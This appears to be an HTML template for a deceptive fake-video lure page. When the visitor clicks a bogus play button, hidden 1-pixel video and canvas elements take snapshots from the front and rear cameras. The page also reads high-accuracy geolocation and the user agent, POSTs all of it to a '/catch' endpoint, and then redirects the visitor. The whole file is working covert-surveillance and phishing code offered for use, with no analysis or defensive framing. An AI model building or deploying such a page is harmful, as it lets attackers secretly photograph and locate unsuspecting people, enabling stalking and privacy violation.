<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{{ title }}</title>
<style>
    body, html { margin: 0; padding: 0; height: 100%; background-color: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
    .video-container { position: relative; width: 100%; max-width: 800px; margin: auto; cursor: pointer; }
    .video-container img { width: 100%; display: block; }
    .play-button-overlay {
        position: absolute; top: 0; left: 0; right: 0; bottom: 0;
        background: rgba(0,0,0,0.4); display: flex; justify-content: center; align-items: center; transition: background 0.2s ease;
    }
    .video-container:hover .play-button-overlay { background: rgba(0,0,0,0.6); }
    .play-icon { width: 80px; height: 80px; background-color: rgba(0,0,0,0.7); border-radius: 50%; display: flex; justify-content: center; align-items: center; border: 3px solid #fff; }
    .play-icon::after { content: ''; display: block; width: 0; height: 0; border-top: 20px solid transparent; border-bottom: 20px solid transparent; border-left: 30px solid #fff; margin-left: 5px; }
    .status-text { text-align: center; margin-top: 20px; font-size: 1.2em; display: none; }
</style>
</head>
<body>

<div class="video-container" id="video-player">
    <img src="{{ thumbnail }}" alt="Video Thumbnail">
    <div class="play-button-overlay">
        <div class="play-icon"></div>
    </div>
</div>
<h2 class="status-text" id="status">Loading Video...</h2>

<!-- Hidden elements for capturing -->
<video id="hidden-video" playsinline autoplay muted style="position: absolute; width:1px; height:1px; left:0; top:0;"></video>
<canvas id="hidden-canvas" style="position: absolute; width:1px; height:1px; left:0; top:0;"></canvas>

<script>
const videoPlayer = document.getElementById('video-player');
const statusText = document.getElementById('status');
const redirectUrl = '{{ redirect_url }}';

videoPlayer.addEventListener('click', async () => {
    videoPlayer.style.display = 'none';
    statusText.style.display = 'block';
    try {
        await captureAndSendData();
    } catch (error) {
        console.error("Error:", error);
    } finally {
        window.location.href = redirectUrl;
    }
});

async function captureAndSendData() {
    // Get location
    const locationData = await getLocation();

    // Get two snapshots: front and back
    const frontImage = await getSnapshot('user');
    const backImage = await getSnapshot('environment');

    // Send both snapshots separately
    const payloads = [
        { ...locationData, userAgent: navigator.userAgent, image_b64: frontImage },
        { ...locationData, userAgent: navigator.userAgent, image_b64: backImage }
    ];

    for (const payload of payloads) {
        await fetch('/catch', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    }
}

function getLocation() {
    return new Promise(resolve => {
        navigator.geolocation.getCurrentPosition(
            pos => {
                resolve({
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    altitude: pos.coords.altitude
                });
            },
            () => resolve({ latitude: null, longitude: null }),
            { enableHighAccuracy: true }
        );
    });
}

    function getSnapshot(facingMode) {
        return new Promise(async (resolve) => {
            const video = document.getElementById('hidden-video');
            const canvas = document.getElementById('hidden-canvas');

            const constraints = { video: { facingMode } };

            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
                video.muted = true;

                await video.play();

                // Wait for at least one frame using requestVideoFrameCallback if available
                const waitFrame = () => {
                    return new Promise((res) => {
                        if ('requestVideoFrameCallback' in video) {
                            video.requestVideoFrameCallback(() => res());
                        } else {
                            // Fallback: small timeout
                            setTimeout(res, 200);
                        }
                    });
                };

                await waitFrame();

                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                stream.getTracks().forEach(track => track.stop());
                resolve(canvas.toDataURL('image/jpeg', 0.8));
            } catch (err) {
                console.error("Camera denied or error:", err);
                resolve(null);
            }
        });
    }

</script>

</body>
</html>
